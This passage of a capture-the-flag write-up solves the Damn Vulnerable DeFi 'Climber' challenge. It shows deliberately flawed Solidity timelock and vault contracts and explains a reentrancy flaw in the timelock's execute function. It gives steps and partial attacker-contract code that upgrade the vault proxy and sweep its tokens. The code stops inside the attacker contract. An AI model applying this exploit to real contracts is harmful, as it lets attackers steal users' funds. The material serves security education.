<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;./ClimberTimelockBase.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span><span class="n">ADMIN_ROLE</span><span class="p">,</span> <span class="n">PROPOSER_ROLE</span><span class="p">,</span> <span class="n">MAX_TARGETS</span><span class="p">,</span> <span class="n">MIN_TARGETS</span><span class="p">,</span> <span class="n">MAX_DELAY</span><span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberConstants.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span>
    <span class="n">InvalidTargetsCount</span><span class="p">,</span>
    <span class="n">InvalidDataElementsCount</span><span class="p">,</span>
    <span class="n">InvalidValuesCount</span><span class="p">,</span>
    <span class="n">OperationAlreadyKnown</span><span class="p">,</span>
    <span class="n">NotReadyForExecution</span><span class="p">,</span>
    <span class="n">CallerNotTimelock</span><span class="p">,</span>
    <span class="n">NewDelayAboveMax</span>
<span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberErrors.sol&quot;</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@title</span> <span class="n">ClimberTimelock</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
 <span class="o">*/</span>
<span class="n">contract</span> <span class="n">ClimberTimelock</span> <span class="ow">is</span> <span class="n">ClimberTimelockBase</span> <span class="p">{</span>
    <span class="n">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="n">address</span><span class="p">;</span>

    <span class="o">/**</span>
     <span class="o">*</span> <span class="nd">@notice</span> <span class="n">Initial</span> <span class="n">setup</span> <span class="k">for</span> <span class="n">roles</span> <span class="ow">and</span> <span class="n">timelock</span> <span class="n">delay</span><span class="o">.</span>
     <span class="o">*</span> <span class="nd">@param</span> <span class="n">admin</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">account</span> <span class="n">that</span> <span class="n">will</span> <span class="n">hold</span> <span class="n">the</span> <span class="n">ADMIN_ROLE</span> <span class="n">role</span>
     <span class="o">*</span> <span class="nd">@param</span> <span class="n">proposer</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">account</span> <span class="n">that</span> <span class="n">will</span> <span class="n">hold</span> <span class="n">the</span> <span class="n">PROPOSER_ROLE</span> <span class="n">role</span>
     <span class="o">*/</span>
    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">admin</span><span class="p">,</span> <span class="n">address</span> <span class="n">proposer</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_setRoleAdmin</span><span class="p">(</span><span class="n">ADMIN_ROLE</span><span class="p">,</span> <span class="n">ADMIN_ROLE</span><span class="p">);</span>
        <span class="n">_setRoleAdmin</span><span class="p">(</span><span class="n">PROPOSER_ROLE</span><span class="p">,</span> <span class="n">ADMIN_ROLE</span><span class="p">);</span>
        <span class="n">_setupRole</span><span class="p">(</span><span class="n">ADMIN_ROLE</span><span class="p">,</span> <span class="n">admin</span><span class="p">);</span>
        <span class="n">_setupRole</span><span class="p">(</span><span class="n">ADMIN_ROLE</span><span class="p">,</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">));</span> <span class="o">//</span> <span class="bp">self</span> <span class="n">administration</span>
        <span class="n">_setupRole</span><span class="p">(</span><span class="n">PROPOSER_ROLE</span><span class="p">,</span> <span class="n">proposer</span><span class="p">);</span>

        <span class="n">delay</span> <span class="o">=</span> <span class="mi">1</span> <span class="n">hours</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">schedule</span><span class="p">(</span>
        <span class="n">address</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">targets</span><span class="p">,</span>
        <span class="n">uint256</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">values</span><span class="p">,</span>
        <span class="nb">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">dataElements</span><span class="p">,</span>
        <span class="n">bytes32</span> <span class="n">salt</span>
    <span class="p">)</span> <span class="n">external</span> <span class="n">onlyRole</span><span class="p">(</span><span class="n">PROPOSER_ROLE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">==</span> <span class="n">MIN_TARGETS</span> <span class="o">||</span> <span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;=</span> <span class="n">MAX_TARGETS</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidTargetsCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">!=</span> <span class="n">values</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidValuesCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">!=</span> <span class="n">dataElements</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidDataElementsCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">bytes32</span> <span class="nb">id</span> <span class="o">=</span> <span class="n">getOperationId</span><span class="p">(</span><span class="n">targets</span><span class="p">,</span> <span class="n">values</span><span class="p">,</span> <span class="n">dataElements</span><span class="p">,</span> <span class="n">salt</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">getOperationState</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span> <span class="o">!=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">Unknown</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">OperationAlreadyKnown</span><span class="p">(</span><span class="nb">id</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">operations</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span><span class="o">.</span><span class="n">readyAtTimestamp</span> <span class="o">=</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">+</span> <span class="n">delay</span><span class="p">;</span>
        <span class="n">operations</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span><span class="o">.</span><span class="n">known</span> <span class="o">=</span> <span class="n">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">/**</span>
     <span class="o">*</span> <span class="n">Anyone</span> <span class="n">can</span> <span class="n">execute</span> <span class="n">what</span><span class="s1">&#39;s been scheduled via `schedule`</span>
     <span class="o">*/</span>
    <span class="n">function</span> <span class="n">execute</span><span class="p">(</span><span class="n">address</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">targets</span><span class="p">,</span> <span class="n">uint256</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">values</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">dataElements</span><span class="p">,</span> <span class="n">bytes32</span> <span class="n">salt</span><span class="p">)</span>
        <span class="n">external</span>
        <span class="n">payable</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">&lt;=</span> <span class="n">MIN_TARGETS</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidTargetsCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">!=</span> <span class="n">values</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidValuesCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">targets</span><span class="o">.</span><span class="n">length</span> <span class="o">!=</span> <span class="n">dataElements</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidDataElementsCount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">bytes32</span> <span class="nb">id</span> <span class="o">=</span> <span class="n">getOperationId</span><span class="p">(</span><span class="n">targets</span><span class="p">,</span> <span class="n">values</span><span class="p">,</span> <span class="n">dataElements</span><span class="p">,</span> <span class="n">salt</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">targets</span><span class="o">.</span><span class="n">length</span><span class="p">;)</span> <span class="p">{</span>
            <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">functionCallWithValue</span><span class="p">(</span><span class="n">dataElements</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
            <span class="n">unchecked</span> <span class="p">{</span>
                <span class="o">++</span><span class="n">i</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">getOperationState</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span> <span class="o">!=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">ReadyForExecution</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">NotReadyForExecution</span><span class="p">(</span><span class="nb">id</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">operations</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span><span class="o">.</span><span class="n">executed</span> <span class="o">=</span> <span class="n">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">updateDelay</span><span class="p">(</span><span class="n">uint64</span> <span class="n">newDelay</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span> <span class="o">!=</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">CallerNotTimelock</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">newDelay</span> <span class="o">&gt;</span> <span class="n">MAX_DELAY</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">NewDelayAboveMax</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">delay</span> <span class="o">=</span> <span class="n">newDelay</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>ClimberVault.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;solady/src/utils/SafeTransferLib.sol&quot;</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;./ClimberTimelock.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span><span class="n">WITHDRAWAL_LIMIT</span><span class="p">,</span> <span class="n">WAITING_PERIOD</span><span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberConstants.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span><span class="n">CallerNotSweeper</span><span class="p">,</span> <span class="n">InvalidWithdrawalAmount</span><span class="p">,</span> <span class="n">InvalidWithdrawalTime</span><span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberErrors.sol&quot;</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@title</span> <span class="n">ClimberVault</span>
 <span class="o">*</span> <span class="nd">@dev</span> <span class="n">To</span> <span class="n">be</span> <span class="n">deployed</span> <span class="n">behind</span> <span class="n">a</span> <span class="n">proxy</span> <span class="n">following</span> <span class="n">the</span> <span class="n">UUPS</span> <span class="n">pattern</span><span class="o">.</span> <span class="n">Upgrades</span> <span class="n">are</span> <span class="n">to</span> <span class="n">be</span> <span class="n">triggered</span> <span class="n">by</span> <span class="n">the</span> <span class="n">owner</span><span class="o">.</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
 <span class="o">*/</span>
<span class="n">contract</span> <span class="n">ClimberVault</span> <span class="ow">is</span> <span class="n">Initializable</span><span class="p">,</span> <span class="n">OwnableUpgradeable</span><span class="p">,</span> <span class="n">UUPSUpgradeable</span> <span class="p">{</span>
    <span class="n">uint256</span> <span class="n">private</span> <span class="n">_lastWithdrawalTimestamp</span><span class="p">;</span>
    <span class="n">address</span> <span class="n">private</span> <span class="n">_sweeper</span><span class="p">;</span>

    <span class="n">modifier</span> <span class="n">onlySweeper</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span> <span class="o">!=</span> <span class="n">_sweeper</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">CallerNotSweeper</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="n">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">///</span> <span class="nd">@custom</span><span class="p">:</span><span class="n">oz</span><span class="o">-</span><span class="n">upgrades</span><span class="o">-</span><span class="n">unsafe</span><span class="o">-</span><span class="n">allow</span> <span class="n">constructor</span>
    <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">_disableInitializers</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">initialize</span><span class="p">(</span><span class="n">address</span> <span class="n">admin</span><span class="p">,</span> <span class="n">address</span> <span class="n">proposer</span><span class="p">,</span> <span class="n">address</span> <span class="n">sweeper</span><span class="p">)</span> <span class="n">external</span> <span class="n">initializer</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">Initialize</span> <span class="n">inheritance</span> <span class="n">chain</span>
        <span class="n">__Ownable_init</span><span class="p">();</span>
        <span class="n">__UUPSUpgradeable_init</span><span class="p">();</span>

        <span class="o">//</span> <span class="n">Deploy</span> <span class="n">timelock</span> <span class="ow">and</span> <span class="n">transfer</span> <span class="n">ownership</span> <span class="n">to</span> <span class="n">it</span>
        <span class="n">transferOwnership</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">new</span> <span class="n">ClimberTimelock</span><span class="p">(</span><span class="n">admin</span><span class="p">,</span> <span class="n">proposer</span><span class="p">)));</span>

        <span class="n">_setSweeper</span><span class="p">(</span><span class="n">sweeper</span><span class="p">);</span>
        <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Allows</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">to</span> <span class="n">send</span> <span class="n">a</span> <span class="n">limited</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">tokens</span> <span class="n">to</span> <span class="n">a</span> <span class="n">recipient</span> <span class="n">every</span> <span class="n">now</span> <span class="ow">and</span> <span class="n">then</span>
    <span class="n">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="n">address</span> <span class="n">token</span><span class="p">,</span> <span class="n">address</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyOwner</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">WITHDRAWAL_LIMIT</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidWithdrawalAmount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">&lt;=</span> <span class="n">_lastWithdrawalTimestamp</span> <span class="o">+</span> <span class="n">WAITING_PERIOD</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidWithdrawalTime</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>

        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Allows</span> <span class="n">trusted</span> <span class="n">sweeper</span> <span class="n">account</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="nb">any</span> <span class="n">tokens</span>
    <span class="n">function</span> <span class="n">sweepFunds</span><span class="p">(</span><span class="n">address</span> <span class="n">token</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlySweeper</span> <span class="p">{</span>
        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">_sweeper</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">)</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">getSweeper</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_sweeper</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">_setSweeper</span><span class="p">(</span><span class="n">address</span> <span class="n">newSweeper</span><span class="p">)</span> <span class="n">private</span> <span class="p">{</span>
        <span class="n">_sweeper</span> <span class="o">=</span> <span class="n">newSweeper</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">getLastWithdrawalTimestamp</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_lastWithdrawalTimestamp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">uint256</span> <span class="n">timestamp</span><span class="p">)</span> <span class="n">private</span> <span class="p">{</span>
        <span class="n">_lastWithdrawalTimestamp</span> <span class="o">=</span> <span class="n">timestamp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">By</span> <span class="n">marking</span> <span class="n">this</span> <span class="n">internal</span> <span class="n">function</span> <span class="k">with</span> <span class="err">`</span><span class="n">onlyOwner</span><span class="err">`</span><span class="p">,</span> <span class="n">we</span> <span class="n">only</span> <span class="n">allow</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">account</span> <span class="n">to</span> <span class="n">authorize</span> <span class="n">an</span> <span class="n">upgrade</span>
    <span class="n">function</span> <span class="n">_authorizeUpgrade</span><span class="p">(</span><span class="n">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="n">internal</span> <span class="n">override</span> <span class="n">onlyOwner</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="goal">Goal</h2>
<p>To pass this challenge, we must take all DVT tokens from the vault (<code>ClimberVault</code> contract).</p>
<h2 id="exploit">Exploit</h2>
<p>In this CTF, again, we are dealing with upgradeable proxies. The <code>ClimberVault</code> is <code>UUPSUpgradeable</code> proxy, which means there is a proxy contract at the front, and whenever we are interacting with the vault, a call is made to the proxy contract which then delegates call to the <code>ClimberVault</code> (logic/implementation) contract.</p>
<p>When <code>ClimberVault</code> contract is deployed, we can see that its <code>initialize</code> function is called, and inside this function, among other things, the ownership to this contract is transferred to a newly instantiated <code>ClimberTimelock</code> contract.</p>
<p>In order to exploit the <code>ClimberVault</code>, we need to find a way to upgrade the proxy to point to a different version of the vault, and inside this new version we should set the malicious contract as the <code>_sweeper</code> and sweep all the funds from the vault.</p>
<p>To do this we can make use of the <code>ClimberTimelock</code> contract.</p>
<p>After inspecting the code inside <code>ClimberTimelock</code>, we can see that the purpose of this contract is to <code>schedule</code> and <code>execute</code> transactions on a time basis. Since this contract is the owner of <code>ClimberVault</code>, we can try to <code>schedule</code> and <code>execute</code> transactions that will trigger functions from the <code>ClimberVaul</code> contract.</p>
<p>The reason <code>ClimberTimelock</code> is vulnerable to attack is beacuse the following check is done after an effect has already taken place</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="ss">(</span><span class="nv">getOperationState</span><span class="ss">(</span><span class="nv">id</span><span class="ss">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nv">OperationState</span>.<span class="nv">ReadyForExecution</span><span class="ss">)</span><span class="w"> </span>{
<span class="w">  </span><span class="nv">revert</span><span class="w"> </span><span class="nv">NotReadyForExecution</span><span class="ss">(</span><span class="nv">id</span><span class="ss">)</span><span class="c1">;</span>
}
</code></pre></div>

<p>if this check was before line 88, it would not have been possible to expolit this CTF.
This way <code>ClimberTimelock</code> violates the <code>checks-effects-interactions</code> and enables a <code>reentrancy attack</code>.</p>
<p>The sequence of steps we need to take in order to abuse <code>ClimberTimelock</code> is the following:</p>
<ol>
<li>create AttackerVault contract, this contract will be identical to ClimberVault, with only difference one difference, we will make _setSweeper function inside it to be public</li>
<li>
<p>prepare the necessary data in our <code>ClimberAttacker</code> contract that will be used as a function parameters to call <code>execute</code> function from <code>ClimberTimelock</code>. This data will consists the following:
<br />
<ul>
  <li>array of addresses called targets, first and second items will hold the address of ClimberTimelock, third and fourth items will hold the address of ClimberVault, fift item will hold the value of the ClimberAttacker contract</li>
  <li>array of uints called values, they should be 0 so no need to assign anything to them</li>
  <li>array of bytes called dataElements, first item will hold the value of the abi encoded function signature of grantRole function (this will be used to set the ClimberAttacker to have the PROPOSER_ROLE in order for ClimberAttacker contract to be able to schedule transactions inside ClimberTimelock); second item will hold the value of the abi encoded function signature of updateDelay (this will be used to update the delay inside ClimberTimelock to 0, so we don't have to wait 1 hour to execute a scheduled transaction); third item will hold the value of the abi encoded function signature of upgradeTo (this will update the vault (ClimberVault) proxy to point to the newly created malicious contract AttackerVault which will be the new update version of the vault); fourth item will hold the value of the abi encoded function signature of _setSweeper (inside the new version of the vault, we will set _setSweepet to be public so anyone can call it and we will set the sweeper of the vault to be the ClimberAttacker contract); fifth item will hold the value of the abi encoded function signature of makeSchedule function (we will add this function inside ClimberAttacker contract, it will be a callback function that ClimberTimelock contract will call after executing the last transaction sent to execute function)</li>
  </ul></p>
</li>
<li>
<p>create attack function, inside this function we will call execute from ClimberTimelock with the previously prepared data, after the call has finished we will call sweepFunds() function from ClimberAttacker to sweep the funds from the vault</p>
</li>
<li>create makeSchedule function, inside this function we will call schedule from ClimberTimelock with the previously prepared data, this is a callback function that will be triggered after the last transction from execute is called</li>
</ol>
<h2 id="attacker-contract-code">Attacker contract code</h2>
<p>ClimberAttacker.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span> <span class="n">PROPOSER_ROLE</span> <span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberConstants.sol&quot;</span><span class="p">;</span>

<span class="n">contract</span> <span class="n">ClimberAttacker</span> <span class="p">{</span>
    <span class="n">address</span> <span class="n">immutable</span> <span class="n">timelock</span><span class="p">;</span>
    <span class="n">address</span> <span class="n">immutable</span> <span class="n">vault</span><span class="p">;</span>
    <span class="n">address</span> <span class="n">immutable</span> <span class="n">attackerVault</span><span class="p">;</span>
    <span class="n">address</span> <span class="n">immutable</span> <span class="n">token</span><span class="p">;</span>

    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">payable</span> <span class="n">_timelock</span><span class="p">,</span> <span class="n">address</span> <span class="n">_vault</span><span class="p">,</span> <span class="n">address</span> <span class="n">_attackerVault</span><span class="p">,</span> <span class="n">address</span> <span class="n">_token</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">timelock</span> <span class="o">=</span> <span class="n">_timelock</span><span class="p">;</span>
        <span class="n">vault</span> <span class="o">=</span> <span class="n">_vault</span><span class="p">;</span>
        <span class="n">attackerVault</span> <span class="o">=</span> <span class="n">_attackerVault</span><span class="p">;</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">_token</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">We</span> <span class="n">call</span> <span class="n">this</span> <span class="n">function</span> <span class="n">first</span> <span class="p">(</span><span class="n">externally</span><span class="p">)</span>
    <span class="n">function</span> <span class="n">attack</span><span class="p">()</span> <span class="n">external</span> <span class="p">{</span>
        <span class="nb">bytes</span> <span class="n">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">prepareData</span><span class="p">(</span><span class="s2">&quot;execute(address[],uint256[],bytes[],bytes32)&quot;</span><span class="p">);</span>

        <span class="p">(</span><span class="nb">bool</span> <span class="n">ok</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">address</span><span class="p">(</span><span class="n">timelock</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
        <span class="n">require</span><span class="p">(</span><span class="n">ok</span><span class="p">,</span> <span class="s2">&quot;call failed&quot;</span><span class="p">);</span>

        <span class="o">//</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">called</span> <span class="n">last</span>
        <span class="n">sweepFunds</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">called</span> <span class="n">second</span> <span class="n">internally</span>
    <span class="n">function</span> <span class="n">makeSchedule</span><span class="p">()</span> <span class="n">external</span> <span class="p">{</span>
        <span class="nb">bytes</span> <span class="n">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">prepareData</span><span class="p">(</span><span class="s2">&quot;schedule(address[],uint256[],bytes[],bytes32)&quot;</span><span class="p">);</span>

        <span class="p">(</span><span class="nb">bool</span> <span class="n">ok</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">address</span><span class="p">(</span><span class="n">timelock</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
        <span class="n">require</span><span class="p">(</span><span class="n">ok</span><span class="p">,</span> <span class="s2">&quot;call failed&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">prepareData</span><span class="p">(</span><span class="n">string</span> <span class="n">memory</span> <span class="n">fnName</span><span class="p">)</span> <span class="n">private</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bytes</span> <span class="n">memory</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">address</span><span class="p">[]</span> <span class="n">memory</span> <span class="n">targets</span> <span class="o">=</span> <span class="n">new</span> <span class="n">address</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>
        <span class="n">targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">timelock</span><span class="p">;</span>
        <span class="n">targets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">targets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">vault</span><span class="p">;</span>
        <span class="n">targets</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="n">targets</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">);</span>

